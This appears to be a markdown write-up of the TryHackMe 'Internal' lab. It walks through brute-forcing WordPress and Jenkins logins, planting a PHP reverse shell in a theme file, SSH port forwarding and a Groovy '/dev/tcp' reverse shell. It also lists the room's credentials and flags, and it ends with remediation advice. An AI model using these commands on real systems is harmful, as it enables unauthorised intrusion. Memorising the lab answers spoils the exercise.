@@ -1,0 +1,385 @@
+# Internal CTF — TryHackMe Writeup
+
+> **Platform:** TryHackMe  
+> **Room:** Internal  
+> **Difficulty:** Hard  
+> **Type:** Black Box Penetration Test  
+> **Tools Used:** nmap, gobuster, wpscan, hydra, netcat, ssh port forwarding
+
+---
+
+## Table of Contents
+
+- [Engagement Overview](#engagement-overview)
+- [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
+- [Phase 2 — Web Enumeration](#phase-2--web-enumeration)
+- [Phase 3 — WordPress Attack](#phase-3--wordpress-attack)
+- [Phase 4 — Remote Code Execution via Theme Editor](#phase-4--remote-code-execution-via-theme-editor)
+- [Phase 5 — Post-Exploitation & Lateral Movement](#phase-5--post-exploitation--lateral-movement)
+- [Phase 6 — Pivoting to Jenkins via SSH Tunneling](#phase-6--pivoting-to-jenkins-via-ssh-tunneling)
+- [Phase 7 — Jenkins RCE & Container Escape](#phase-7--jenkins-rce--container-escape)
+- [Phase 8 — Root Access via SSH](#phase-8--root-access-via-ssh)
+- [Flags](#flags)
+- [Key Takeaways](#key-takeaways)
+
+---
+
+## Engagement Overview
+
+This room simulates a real-world black box penetration test against an internal environment. The objective is to find and capture two flags (`user.txt` and `root.txt`) using any tools or techniques available. No hints are given about where the flags are located.
+
+**Scope:** Only the assigned target IP is in scope.  
+**Pre-requisite:** Add the target to your `/etc/hosts` file as `internal.thm`.
+
+### Setting up /etc/hosts
+
+```bash
+sudo nano /etc/hosts
+```
+
+Add the following line:
+
+```
+10.10.X.X    internal.thm
+```
+
+This maps the domain name `internal.thm` to the target IP, which is required because the web server uses virtual host routing — without this, certain pages won't load correctly.
+
+---
+
+## Phase 1 — Reconnaissance
+
+### Nmap Port Scan
+
+```bash
+nmap -sC -sV -p- 10.10.X.X
+```
+
+**Flags explained:**
+- `-sC` — Run default NSE scripts for service fingerprinting
+- `-sV` — Detect service and version information
+- `-p-` — Scan all 65535 ports to avoid missing services on non-standard ports
+
+**Results:**
+
+| Port | State | Service | Version |
+|------|-------|---------|---------|
+| 22   | open  | ssh     | OpenSSH 7.6p1 Ubuntu |
+| 80   | open  | http    | Apache httpd 2.4.29 (Ubuntu) |
+
+Only two ports are open. The main attack surface is port 80 (HTTP). SSH on port 22 will be useful later once credentials are found.
+
+---
+
+## Phase 2 — Web Enumeration
+
+### Step 1 — Visit the Web Server
+
+Navigating to `http://10.10.X.X` shows the default Apache2 Ubuntu page — nothing useful here directly, but this tells us the web server is freshly configured and likely has hidden content elsewhere.
+
+### Step 2 — Gobuster Directory Brute Force
+
+```bash
+gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+```
+
+**Flags explained:**
+- `dir` — Directory/file enumeration mode
+- `-u` — Target URL
+- `-w` — Wordlist to use
+- `-x php,html,txt` — Also check for files with these extensions, not just directories
+
+**Discovered paths:**
+
+| Path | Status | Notes |
+|------|--------|-------|
+| `/blog` | 301 | WordPress blog |
+| `/wordpress` | 301 | WordPress installation files |
+| `/javascript` | 301 | JS assets |
+| `/phpmyadmin` | 301 | Database admin panel |
+
+Two immediately interesting findings: a **WordPress blog** at `/blog` and a **phpMyAdmin** panel. The WordPress blog is the primary target since it's an interactive application with known attack vectors.
+
+---
+
+## Phase 3 — WordPress Attack
+
+### Step 1 — WPScan Enumeration
+
+```bash
+wpscan --url http://internal.thm/blog -e u
+```
+
+**Flags explained:**
+- `--url` — Target WordPress URL
+- `-e u` — Enumerate users (find valid WordPress usernames)
+
+**Key findings from WPScan:**
+- WordPress version: **5.4.2** (running **Twenty Seventeen** theme v2.3)
+- **XML-RPC is enabled** at `/blog/xmlrpc.php` — this allows password brute-forcing via the XML-RPC API (faster than the login page because it has no rate limiting by default)
+- **Username discovered: `admin`**
+
+### Step 2 — Brute Force the Admin Password
+
+Since we have a valid username (`admin`) and XML-RPC is enabled, we can use WPScan to brute force the password through the XML-RPC endpoint:
+
+```bash
+wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
+```
+
+**Flags explained:**
+- `-U admin` — Target the `admin` user specifically
+- `-P` — Path to the password wordlist
+
+WPScan uses the XML-RPC `system.multicall` method to test many passwords per request, making this significantly faster than attacking the login form directly.
+
+**Result:**
+
+```
+[SUCCESS] - admin / my2boys
+```
+
+**WordPress credentials: `admin:my2boys`**
+
+---
+
+## Phase 4 — Remote Code Execution via Theme Editor
+
+With admin credentials, we have full access to the WordPress dashboard. WordPress admins can edit theme PHP files directly from the dashboard — this is our path to remote code execution (RCE).
+
+### Step 1 — Log into WordPress Admin
+
+Navigate to `http://internal.thm/blog/wp-admin` and log in with `admin:my2boys`.
+
+### Step 2 — Inject a PHP Reverse Shell
+
+Go to: **Appearance → Theme Editor → Select: Twenty Seventeen → 404 Template (404.php)**
+
+Replace the contents of `404.php` with a PHP reverse shell. You can get one from `/usr/share/webshells/php/php-reverse-shell.php` on Kali. Update the IP and port in the shell to match your attacker machine.
+
+The file is accessible at:
+
+```
+http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+```
+
+### Step 3 — Set up a Listener and Trigger the Shell
+
+On your attacker machine:
+
+```bash
+nc -lvnp 4444
+```
+
+Then visit the 404.php URL in your browser to execute the shell. You'll receive a reverse connection as the `www-data` user — the web server service account.
+
+---
+
+## Phase 5 — Post-Exploitation & Lateral Movement
+
+Now inside the machine as `www-data`, the goal is to find credentials to escalate to a real user account.
+
+### Searching for Credentials
+
+```bash
+cd /opt
+ls
+# containerd  wp-save.txt
+
+cat wp-save.txt
+```
+
+**Output:**
+
+```
+Bill,
+
+Aubreanna needed these credentials for something later. Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+```
+
+Credentials left in a plaintext file in `/opt` — a classic misconfiguration. We now have credentials for the user `aubreanna`.
+
+### Switching to aubreanna
+
+```bash
+su aubreanna
+# Password: bubb13guM!@#123
+
+cd ~
+ls
+# jenkins.txt  snap  user.txt
+
+cat user.txt
+```
+
+**User Flag: `THM{int3rna1_fl4g_1}`**
+
+### Discovering Internal Services
+
+```bash
+cat jenkins.txt
+# Internal Jenkins service is running on 172.17.0.2:8080
+```
+
+Jenkins is running internally inside a Docker container on the Docker bridge network (`172.17.0.x`). It's not accessible from outside — we need to tunnel into it.
+
+---
+
+## Phase 6 — Pivoting to Jenkins via SSH Tunneling
+
+Since Jenkins is only accessible from inside the target machine (on `172.17.0.2:8080`), we use **SSH local port forwarding** to create a tunnel from our attacker machine directly to the Jenkins container.
+
+```bash
+ssh -L 8081:172.17.0.2:8080 aubreanna@internal.thm
+```
+
+**Command breakdown:**
+- `-L 8081:172.17.0.2:8080` — Forward our local port `8081` through the SSH connection to `172.17.0.2:8080` (the Jenkins container, as seen from inside the target machine)
+- `aubreanna@internal.thm` — Connect via SSH as `aubreanna`
+
+After this tunnel is established, we can visit `http://localhost:8081` on our attacker machine and reach the Jenkins web interface — even though Jenkins is on a private internal network.
+
+---
+
+## Phase 7 — Jenkins RCE & Container Escape
+
+### Step 1 — Brute Force Jenkins Login
+
+Jenkins is running on `localhost:8081` (via our tunnel). We don't have the credentials yet, so we brute force using Hydra:
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8081 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+```
+
+**Command breakdown:**
+- `-l admin` — Username to try (Jenkins commonly uses `admin`)
+- `-P rockyou.txt` — Password wordlist
+- `-s 8081` — Non-standard port
+- `http-post-form` — The login uses a POST form
+- The form string specifies the endpoint, POST parameters, and the failure message Jenkins returns on bad login
+
+**Result:**
+
+```
+[8081][http-post-form] host: localhost   login: admin   password: spongebob
+```
+
+**Jenkins credentials: `admin:spongebob`**
+
+### Step 2 — Execute a Reverse Shell via Jenkins Script Console
+
+Jenkins has a built-in **Script Console** (Manage Jenkins → Script Console) that executes **Groovy** code with the same privileges as the Jenkins process. This is a well-known RCE vector.
+
+Navigate to: **http://localhost:8081/script**
+
+Paste the following Groovy reverse shell (update the IP to your attacker machine):
+
+```groovy
+def cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/YOUR_IP/9002 0>&1"]
+def proc = new ProcessBuilder(cmd).start()
+```
+
+**What this does:**
+- Creates a list representing a shell command
+- `bash -i` — Interactive bash
+- `>& /dev/tcp/IP/PORT` — Redirect stdin/stdout/stderr to a TCP connection back to our listener
+- `ProcessBuilder` — Java class used to spawn the subprocess
+
+On your attacker machine, set up a listener first:
+
+```bash
+nc -lvnp 9002
+```
+
+Click **Run** in the Script Console. You'll receive a shell inside the Jenkins Docker container.
+
+### Step 3 — Find Root Credentials in the Container
+
+```bash
+cd /opt
+cat note.txt
+```
+
+**Output:**
+
+```
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you need access to the root user account.
+
+root:tr0ub13guM!@#123
+```
+
+Root credentials stored inside the Jenkins container — another example of sensitive data left in plaintext files.
+
+---
+
+## Phase 8 — Root Access via SSH
+
+With the root password in hand, SSH directly into the target machine as root:
+
+```bash
+ssh root@internal.thm
+# Password: tr0ub13guM!@#123
+```
+
+```bash
+whoami
+# root
+
+cd /root
+cat root.txt
+```
+
+**Root Flag: `THM{d0ck3r_d3str0y3r}`**
+
+---
+
+## Flags
+
+| Flag | Location | Value |
+|------|----------|-------|
+| User Flag | `/home/aubreanna/user.txt` | `THM{int3rna1_fl4g_1}` |
+| Root Flag | `/root/root.txt` | `THM{d0ck3r_d3str0y3r}` |
+
+---
+
+## Attack Chain Summary
+
+```
+Nmap Scan
+    └── Port 80 open (Apache)
+            └── Gobuster → /blog (WordPress), /phpmyadmin
+                    └── WPScan → username: admin, XML-RPC enabled
+                            └── WPScan brute force → admin:my2boys
+                                    └── WordPress Theme Editor → PHP Reverse Shell
+                                            └── www-data shell → /opt/wp-save.txt
+                                                    └── aubreanna:bubb13guM!@#123
+                                                            └── user.txt flag ✓
+                                                            └── jenkins.txt → 172.17.0.2:8080
+                                                                    └── SSH Port Forward → localhost:8081
+                                                                            └── Hydra → admin:spongebob
+                                                                                    └── Jenkins Script Console → Groovy RCE
+                                                                                            └── /opt/note.txt → root:tr0ub13guM!@#123
+                                                                                                    └── SSH as root → root.txt flag ✓
+```
+
+---
+
+## Key Takeaways
+
+**Vulnerabilities identified:**
+
+1. **WordPress XML-RPC brute force** — XML-RPC was enabled with no rate limiting, allowing rapid credential brute forcing without triggering lockouts. *Fix: Disable XML-RPC if not needed, or restrict access to it via `.htaccess`.*
+
+2. **WordPress Theme Editor enabled** — Admin users could edit live PHP files from the browser, leading directly to RCE. *Fix: Disable file editing in `wp-config.php` with `define('DISALLOW_FILE_EDIT', true);`.*
+
+3. **Plaintext credentials in /opt** — Credentials for `aubreanna` and later `root` were stored in world-readable plaintext files. *Fix: Use a secrets manager; never store credentials in flat files.*
+
+4. **Jenkins exposed on internal Docker network with weak credentials** — While not externally accessible, the internal Jenkins instance had a guessable password. *Fix: Enforce strong credentials, use secrets management for CI/CD systems.*
+
+5. **Root credentials inside a Docker container** — Credentials for the host's root account were stored inside a container, undermining the security boundary containers are meant to provide. *Fix: Never store host credentials inside containers.*
+
+6. **SSH tunneling possible** — Once inside the machine, a low-privileged user could freely forward ports to reach internal services. *Fix: Consider restricting SSH tunneling with `AllowTcpForwarding no` in sshd_config for non-admin accounts.*
